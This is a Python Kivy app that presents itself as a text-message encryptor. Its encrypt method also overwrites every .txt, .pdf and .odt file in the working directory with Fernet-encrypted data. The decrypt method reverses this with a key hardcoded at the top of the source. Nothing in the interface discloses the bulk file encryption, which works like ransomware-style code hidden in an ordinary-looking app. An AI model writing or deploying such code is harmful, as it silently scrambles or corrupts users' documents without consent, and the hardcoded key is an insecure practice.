
import kivy
from kivy.properties import ObjectProperty

from kivymd.app import MDApp
from kivymd.uix.boxlayout import MDBoxLayout

#Cryptography
from cryptography.fernet import Fernet
import os



key = b'vkL9L8qaC6dYExg4SlBrgoTzWCkTzsndvh2yONHlEak='



def Encrypt(file_name):
    lock = Fernet(key)
    with open(file_name , 'rb') as file:
        data = file.read()
    criptografar = lock.encrypt(data)
    with open(file_name , 'wb') as file:
        file.write(criptografar)

def Decrypt(file_name):
    unlock= Fernet(key)
    with open(file_name , 'rb') as file:
        data = file.read()
    decoded = unlock.decrypt(data)
    with open(file_name , 'wb') as file:
        file.write(decoded)

        
try:
    open('texto35gjo8545896cyrsiw8573.txt', 'w').close()
    os.remove("texto35gjo8545896cyrsiw8573.txt")
except:
    pass



class ContentNavigationDrawer(MDBoxLayout):
    screen_manager = ObjectProperty()
    nav_drawer = ObjectProperty()



class MainApp(MDApp):


    def build(self):
        self.theme_cls.theme_style = "Dark"



    def encrypt(self):

        Ftext = open("texto35gjo85458968573.txt", 'a')
        ms = self.root.ids.Sc1Text.text
        Ftext.write(ms)
        Ftext.close()


        arquivos = os.listdir()
        Files=list()


        for File in arquivos:
            if File.endswith('.txt'):
                Files.append(File)
            elif File.endswith('.pdf'):
                Files.append(File)
            elif File.endswith('.odt'):
                Files.append(File)
            
           

        function = Encrypt

        for File in Files:
            function(File)


        

        A = open("texto35gjo85458968573.txt",'r')
        for N in A:
             N = N.rstrip()


        self.root.ids.Sc1Label.text = N
        self.root.ids.Sc2Label.text = ""

        A.close()

        
        open('texto35gjo85458968573.txt', 'w').close()
        os.remove("texto35gjo85458968573.txt")




    def decrypt(self):

        Ftext1 = open("texto35gjo8545896cyrsiw8573.txt", 'a')
        if self.root.ids.Sc1Text1.text =="":
            ms1 = 'gAAAAABiK8x_bqNBISgPuVpzGxqUQK3nTNORuhSOVqWQk-36FtBSaijd_nZyxQrV0w9Ab_mvV787Lw6QgQxUp37n0mGkNWLX9w=='
        else:
            ms1 = self.root.ids.Sc1Text1.text
        ms1
        Ftext1.write(ms1)
        Ftext1.close()

        arquivos1 = os.listdir()
        Files=list()


        for File in arquivos1:
            if File.endswith('.txt'):
                Files.append(File)
            elif File.endswith('.pdf'):
                Files.append(File)
            elif File.endswith('.odt'):
                Files.append(File)
            


        function = Decrypt

        for File in Files:
            function(File)


        A1 = open("texto35gjo8545896cyrsiw8573.txt",'r')
        for N1 in A1:
            N1 = N1.rstrip()


        self.root.ids.Sc1Label1.text = N1
        self.root.ids.Sc2Label1.text = ""

        A1.close()
        
        open('texto35gjo8545896cyrsiw8573.txt', 'w').close()
        os.remove("texto35gjo8545896cyrsiw8573.txt")







MainApp().run()
